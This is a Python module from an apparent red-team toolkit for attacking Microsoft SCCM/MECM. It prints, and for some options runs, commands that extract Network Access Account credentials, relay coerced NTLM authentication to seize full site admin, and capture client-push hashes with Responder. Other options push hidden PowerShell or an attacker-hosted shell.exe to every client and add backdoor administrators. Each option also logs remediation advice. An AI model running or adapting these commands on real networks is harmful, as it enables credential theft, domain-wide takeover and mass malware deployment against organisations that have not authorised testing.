"""
Module: SCCM / MECM Abuse
Techniques: NAA credential extraction (DPAPI/WMI/HTTP policy),
            SCCM relay (AdminService / MSSQL), client push abuse,
            deployment payload, site takeover, SCCMSecrets
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("SCCM / MECM ABUSE", "ConfigMgr credential extraction & takeover")
    dc      = input_or_session("dc_ip",    "DC IP")
    dom     = input_or_session("domain",   "Domain")
    user    = input_or_session("username", "Username")
    pw      = input_or_session("password", "Password")
    sccm_ip = prompt("SCCM / SMS Site Server IP or FQDN")
    attacker = SESSION.get("attacker_ip") or "<ATTACKER_IP>"
    iface = SESSION.get("attacker_iface") or "<INTERFACE>"

    print(f"""
  {C}── CREDENTIAL EXTRACTION ────────────────────────────────────────{RST}
  [1]  NAA via DPAPI (SharpSCCM / SharpDPAPI / DPLoot)
  [2]  NAA via WMI CIM repository (CCM_NetworkAccessAccount)
  [3]  NAA via HTTP Policy Request (SCCMHunter / SCCMSecrets)
  [4]  Task Sequence & Collection Variable Secrets
  {C}── RELAY ATTACKS ─────────────────────────────────────────────────{RST}
  [5]  Site Takeover via AdminService API (ntlmrelayx)
  [6]  Site Takeover via MSSQL relay (coerce site server → DB)
  [7]  Client Push Installation Abuse (credential capture)
  [8]  HTTP Management Point Relay (register fake device)
  {C}── POST-COMPROMISE ───────────────────────────────────────────────{RST}
  [9]  Deploy Payload via SCCM Application / Script
  [10] SCCM Admin Console — add backdoor admin
  {C}── ENUMERATION ───────────────────────────────────────────────────{RST}
  [11] Enumerate SCCM Infrastructure (SCCMHunter find)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {C}NAA Credential Extraction via DPAPI:{RST}

  {Y}Requirements: Local admin on SCCM client{RST}

  {Y}SharpSCCM (Windows — run on enrolled client):{RST}
  .\\SharpSCCM.exe local naa -s {sccm_ip}
  .\\SharpSCCM.exe local naa --disk         # from CcmStore.sdf
  .\\SharpSCCM.exe local naa --wmi          # from WMI CIM repo

  {Y}SharpDPAPI (SCCM module — Windows):{RST}
  .\\SharpDPAPI.exe SCCM

  {Y}DPLoot (Linux — remote via SMB):{RST}
  dploot sccm -u '{user}' -p '{pw}' -d {dom} {sccm_ip}
  dploot sccm -u '{user}' -p '{pw}' -d {dom} {sccm_ip} --wmi

  {Y}nxc smb SCCM module:{RST}
  nxc smb {sccm_ip} -u '{user}' -p '{pw}' -d {dom} -M sccm

  {Y}Stored paths on client:{RST}
  C:\\Windows\\CCM\\CcmStore.sdf           (SQLite — persists after uninstall)
  C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA
  HKLM:\\SOFTWARE\\Microsoft\\SMS\\DP\\Credentials
""")
        run_cmd(f"nxc smb {sccm_ip} -u '{user}' -p '{pw}' -d {dom} -M sccm")
        add_finding("SCCM NAA Credential Exposure", "Critical",
                    f"NAA credentials extracted from SCCM client on {sccm_ip}",
                    "Disable NAA or restrict to minimal rights; rotate NAA password; audit DPAPI blobs")

    elif c == "2":
        print(f"""
  {C}NAA via WMI CIM Class (CCM_NetworkAccessAccount):{RST}

  {Y}Local — PowerShell on SCCM client (admin required):{RST}
  $Class = [WmiClass]"\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig:CCM_NetworkAccessAccount"
  $Instances = $Class.GetInstances()
  $Instances | ForEach-Object {{
    [System.Text.Encoding]::Unicode.GetString(
      [System.Convert]::FromBase64String($_.NetworkAccessUsername))
    [System.Text.Encoding]::Unicode.GetString(
      [System.Convert]::FromBase64String($_.NetworkAccessPassword))
  }}

  {Y}Remote via WMI (admin on target):{RST}
  Invoke-WMIMethod -Class CCM_NetworkAccessAccount \\
    -Namespace root\\ccm\\policy\\Machine\\ActualConfig \\
    -ComputerName {sccm_ip}

  {Y}SharpSCCM --wmi flag:{RST}
  .\\SharpSCCM.exe local naa --wmi

  {Y}SCCMHunter dpapi module (Linux — decrypts WMI blobs):{RST}
  python3 sccmhunter.py dpapi -u '{user}' -p '{pw}' \\
    -d {dom} -dc-ip {dc} -both
""")
        run_cmd(
            f"nxc smb {sccm_ip} -u '{user}' -p '{pw}' -d {dom} "
            f"-x 'powershell -c \"([WmiClass]\\\"\\\\\\\\localhost\\\\root\\\\ccm\\\\policy"
            f"\\\\Machine\\\\ActualConfig:CCM_NetworkAccessAccount\\\").GetInstances()\"'"
        )

    elif c == "3":
        print(f"""
  {C}NAA via HTTP Policy Request (register fake device → pull policies):{RST}

  {Y}SCCMHunter http module (create + register fake machine):{RST}
  python3 sccmhunter.py http \\
    -u '{user}' -p '{pw}' \\
    -d {dom} -dc-ip {dc} \\
    -mp {sccm_ip} \\
    -save

  {Y}SCCMSecrets.py (enumerate + dump all secret policies):{RST}
  python3 sccmsecrets.py \\
    -u '{user}' -p '{pw}' -d {dom} \\
    -dc-ip {dc} \\
    -mp http://{sccm_ip} \\
    -client-name FAKECLIENT01 \\
    -dump-all

  {Y}How it works:{RST}
  1. Attacker creates machine account (or uses existing computer creds)
  2. Registers fake device: POST http://{sccm_ip}/ccm_system_windowsauth/request
  3. Device approved → request all policies:
     GET http://{sccm_ip}/ccm_system/request
  4. Fetch specific NAA policy:
     GET http://{sccm_ip}/SMS_MP/.sms_pol/<GUID>
  5. Decode + decrypt policy → plaintext NAA credentials

  {Y}Unauthenticated (if auto-approval misconfigured):{RST}
  python3 sccmsecrets.py \\
    -mp http://{sccm_ip} \\
    -client-name FAKECLIENT01 \\
    --anonymous
""")
        run_cmd(
            f"python3 sccmhunter.py http -u '{user}' -p '{pw}' "
            f"-d {dom} -dc-ip {dc} -mp {sccm_ip} -save"
        )
        add_finding("SCCM Policy Request Abuse", "Critical",
                    f"Fake device registered to {sccm_ip}; NAA/secret policies retrieved",
                    "Set client approval to 'Manually approve each computer'; disable HTTP MP; require PKI")

    elif c == "4":
        print(f"""
  {C}Task Sequence & Collection Variable Secret Extraction:{RST}

  {Y}Task sequences may contain:{RST}
  - Domain join account credentials
  - Local admin passwords
  - Application install credentials
  - Custom scripts with hardcoded secrets

  {Y}SharpSCCM — get task sequences (Windows):{RST}
  .\\SharpSCCM.exe get secrets -s {sccm_ip}
  .\\SharpSCCM.exe get collections -s {sccm_ip}

  {Y}SCCMHunter — dump all collection variables:{RST}
  python3 sccmhunter.py http \\
    -u '{user}' -p '{pw}' -d {dom} \\
    -dc-ip {dc} -mp {sccm_ip} \\
    -dump-all -collection-variables

  {Y}WMI — enumerate task sequences (admin on site server):{RST}
  Get-WMIObject -Namespace root\\sms\\site_<SITECODE> \\
    -Class SMS_TaskSequence -ComputerName {sccm_ip} |
  Select-Object Name,Description,PackageID

  {Y}Manual policy file inspection:{RST}
  # After device registration, request all policies:
  # Parse XML policies for <secret> / <credential> tags
""")

    elif c == "5":
        attacker    = input_or_session("attacker_ip", "Attacker IP")
        provider_ip = prompt("Remote SMS Provider IP (must differ from site server)")
        target_user = prompt("User to grant Full Admin (e.g. lowpriv_user)")
        target_sid  = prompt("SID of target user (from lookupsid)")
        print(f"""
  {C}SCCM Site Takeover via AdminService API relay:{RST}

  {Y}Concept:{RST}
  Site server machine account is default member of SMS Admins group.
  Coerce site server auth → relay to remote SMS Provider AdminService API
  → add arbitrary user as SCCM Full Administrator.

  {Y}Requirements:{RST}
  - Valid domain credentials
  - Remote SMS Provider (site server ≠ SMS Provider)
  - Network access to AdminService (HTTPS/{provider_ip})

  {Y}Terminal 1 — ntlmrelayx targeting AdminService:{RST}
  impacket-ntlmrelayx \\
    -t https://{provider_ip}/AdminService/wmi/SMS_Admin \\
    -smb2support \\
    --adminservice \\
    --logonname '{dom}\\{target_user}' \\
    --displayname '{target_user}' \\
    --objectsid '{target_sid}'

  {Y}Terminal 2 — Coerce site server auth:{RST}
  python3 tools/PetitPotam/PetitPotam.py \\
    -u '{user}' -p '{pw}' \\
    {attacker} {sccm_ip}

  {Y}Verify admin added:{RST}
  python3 sccmhunter.py show -u '{target_user}' -p '<password>' \\
    -d {dom} -dc-ip {dc} admin

  {Y}ntlmrelayx success output:{RST}
  [+] Authenticating against https://{provider_ip} as CORP/{sccm_ip.split(".")[0]}$
  [+] Adding administrator via SCCM AdminService...
  [+] Server returned code 201, attack successful
""")
        add_finding("SCCM Site Takeover via AdminService", "Critical",
                    f"User '{target_user}' granted Full Admin via AdminService relay on {provider_ip}",
                    "Enforce PKI auth for AdminService; monitor SMS Admins group (Event 4732); require HTTPS with EPA")

    elif c == "6":
        attacker = input_or_session("attacker_ip", "Attacker IP")
        db_ip    = prompt("SCCM Site Database Server IP")
        print(f"""
  {C}SCCM Site Takeover via MSSQL Relay:{RST}

  {Y}Concept:{RST}
  Coerce NTLM auth from site server machine account →
  relay to site database MSSQL server →
  INSERT into RBAC_Admins table → Full Administrator.

  {Y}Requirements:{RST}
  - MSSQL reachable on site database server
  - SMB signing disabled on DB server (or direct MSSQL relay)
  - Site server ≠ database server

  {Y}Terminal 1 — ntlmrelayx targeting MSSQL:{RST}
  impacket-ntlmrelayx \\
    -t mssql://{db_ip} \\
    -smb2support \\
    --no-smb-server \\
    -q "USE CM_<SITECODE>; \\
        INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) \\
        VALUES (0x<your_sid>,'{dom}\\{user}',0,0,'',GETDATE(),'',GETDATE(),'<SITE>');"

  {Y}Terminal 2 — Coerce site server:{RST}
  python3 tools/PetitPotam/PetitPotam.py \\
    -u '{user}' -p '{pw}' \\
    {attacker} {sccm_ip}

  {Y}Verify (SharpSCCM):{RST}
  .\\SharpSCCM.exe get admins -s {sccm_ip}
""")
        add_finding("SCCM Site Takeover via MSSQL", "Critical",
                    f"MSSQL relay to {db_ip} used to insert backdoor SCCM admin",
                    "Enable SMB signing on DB server; restrict MSSQL access; monitor RBAC_Admins table")

    elif c == "7":
        attacker = input_or_session("attacker_ip", "Attacker IP")
        print(f"""
  {C}SCCM Client Push Installation Abuse:{RST}

  {Y}Concept:{RST}
  When SCCM automatic client push is enabled, the site server
  authenticates to new machines using a dedicated push account.
  Coerce or wait for push → capture hash → crack or relay.

  {Y}Method 1 — Wait for automatic push (passive):{RST}
  sudo responder -I {iface} -rdwv
  # Wait for push account to authenticate to attacker host

  {Y}Method 2 — Trigger push via AD discovery:{RST}
  # Add new computer to AD in a collection SCCM monitors:
  impacket-addcomputer {dom}/{user}:'{pw}' \\
    -computer-name 'PUSHTEST$' -computer-pass 'P@ss1234!' \\
    -dc-ip {dc}
  # Wait for SCCM to discover + push client → capture creds

  {Y}Method 3 — SharpSCCM trigger push:{RST}
  .\\SharpSCCM.exe invoke client-push -s {sccm_ip} \\
    -t {attacker}

  {Y}Captured push account hash (Responder):{RST}
  # Crack: hashcat -m 5600 <NTLMv2_hash> rockyou.txt
  # Relay: impacket-ntlmrelayx -t ldap://{dc} -smb2support --delegate-access
""")
        add_finding("SCCM Client Push Credential Capture", "High",
                    f"SCCM client push account authentication captured from {sccm_ip}",
                    "Disable automatic client push; use PKI (HTTPS) for client communication; require SMB signing")

    elif c == "8":
        attacker = input_or_session("attacker_ip", "Attacker IP")
        print(f"""
  {C}HTTP Management Point Relay (register fake device via relay):{RST}

  {Y}Concept:{RST}
  Relay machine account NTLM auth to HTTP MP endpoint →
  register fake SCCM device → pull NAA credentials from policies.

  {Y}ntlmrelayx fork by Tw1sm (MP relay support):{RST}
  impacket-ntlmrelayx \\
    -t http://{sccm_ip}/ccm_system_windowsauth/request \\
    -smb2support \\
    --sccm --sccm-mp {sccm_ip}

  {Y}Trigger coercion from any domain machine:{RST}
  python3 printerbug.py \\
    '{dom}/{user}:{pw}@<any_domain_machine>' \\
    {attacker}

  {Y}Result:{RST}
  [+] Device registered: FAKECLIENT (GUID: <guid>)
  [+] Requesting secret policies...
  [+] NAA Username: {dom}\\svc_naa
  [+] NAA Password: <plaintext>
""")
        add_finding("SCCM HTTP MP Relay", "Critical",
                    f"Fake device registered to HTTP MP on {sccm_ip}; secret policies retrieved",
                    "Enforce HTTPS for Management Point; enable PKI; disable HTTP fallback")

    elif c == "9":
        payload_path = prompt("Payload path on attacker (e.g. /tmp/shell.exe)")
        target_coll  = prompt("Target collection name or ID (e.g. All Systems)")
        print(f"""
  {C}Deploy Payload via SCCM Application (Full Admin required):{RST}

  {Y}SharpSCCM — execute command on all clients:{RST}
  .\\SharpSCCM.exe exec -s {sccm_ip} \\
    -n "{target_coll}" \\
    -p "cmd /c powershell -w hidden -enc <base64_payload>"

  .\\SharpSCCM.exe exec -s {sccm_ip} \\
    -n "{target_coll}" \\
    -p "cmd /c \\\\\\\\{attacker}\\\\share\\\\shell.exe"

  {Y}SCCMHunter — deploy via admin rights:{RST}
  python3 sccmhunter.py admin \\
    -u '{user}' -p '{pw}' -d {dom} \\
    -dc-ip {dc} -sccm {sccm_ip} \\
    -command "powershell -w hidden -c <payload>"

  {Y}Via WMI (SMS_Application class):{RST}
  # Create application package
  $App = [WMIClass]"\\\\{sccm_ip}\\root\\sms\\site_<CODE>:SMS_Application"
  $New = $App.CreateInstance()
  $New.LocalizedDisplayName = "Windows Update"
  $New.Put()

  {Y}Monitor execution:{RST}
  .\\SharpSCCM.exe get deployments -s {sccm_ip}
""")
        add_finding("SCCM Payload Deployment", "Critical",
                    f"Command/payload deployed via SCCM to collection '{target_coll}' on {sccm_ip}",
                    "Audit SCCM deployments; alert on new application/script deployments; restrict Full Admin role")

    elif c == "10":
        backdoor_user = prompt("Backdoor user to add as SCCM admin")
        print(f"""
  {C}Add Backdoor SCCM Administrator (Full Admin required):{RST}

  {Y}SharpSCCM — add admin:{RST}
  .\\SharpSCCM.exe add admin \\
    -s {sccm_ip} \\
    -u '{dom}\\{backdoor_user}' \\
    --role "Full Administrator"

  {Y}SCCMHunter admin shell — interactive:{RST}
  python3 sccmhunter.py admin \\
    -u '{user}' -p '{pw}' -d {dom} \\
    -dc-ip {dc} -sccm {sccm_ip}
  # (admin shell prompt)
  >> add_admin {backdoor_user} Full Administrator

  {Y}Direct MSSQL (if DB accessible):{RST}
  impacket-mssqlclient {dom}/{user}:'{pw}'@{sccm_ip} -windows-auth
  SQL> USE CM_<SITECODE>;
  SQL> SELECT * FROM RBAC_Admins;
  SQL> INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,...)
       VALUES (<sid>,'{dom}\\{backdoor_user}',0,0,...);

  {Y}Verify:{RST}
  .\\SharpSCCM.exe get admins -s {sccm_ip}
""")
        add_finding("SCCM Backdoor Admin Created", "Critical",
                    f"User '{backdoor_user}' added as SCCM Full Administrator on {sccm_ip}",
                    "Audit RBAC_Admins table regularly; monitor Event 4732 (SMS Admins group); implement least-privilege")

    elif c == "11":
        print(f"""
  {C}Enumerate SCCM Infrastructure:{RST}

  {Y}SCCMHunter — full recon:{RST}
  python3 sccmhunter.py find \\
    -u '{user}' -p '{pw}' \\
    -d {dom} -dc-ip {dc}
  # Discovers: Site Server, Management Points, Distribution Points,
  #            SMS Provider, SQL Server, Fallback Status Point

  {Y}SharpSCCM — enumerate from domain (no SCCM access needed):{RST}
  .\\SharpSCCM.exe get site-info -d {dom} -dc {dc}

  {Y}LDAP — find SCCM servers (mSSMSSite objects):{RST}
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b 'DC={dom.replace(".", ",DC=")}' \\
    '(objectClass=mSSMSSite)' siteCode serverName

  {Y}DNS — find MP / DP:{RST}
  dig +short SCCM.{dom} @{dc}
  dig +short SMS.{dom} @{dc}
  dig SRV _mssms._tcp.{dom} @{dc}

  {Y}nxc smb — identify SCCM servers:{RST}
  nxc smb {attacker}/24 \\
    -u '{user}' -p '{pw}' -d {dom} \\
    -M sccm

  {Y}Check AdminService (HTTPS probe):{RST}
  curl -k -u '{user}:{pw}' \\
    https://{sccm_ip}/AdminService/wmi/SMS_Site | python3 -m json.tool
""")
        run_cmd(
            f"python3 sccmhunter.py find -u '{user}' -p '{pw}' "
            f"-d {dom} -dc-ip {dc}"
        )

    pause()
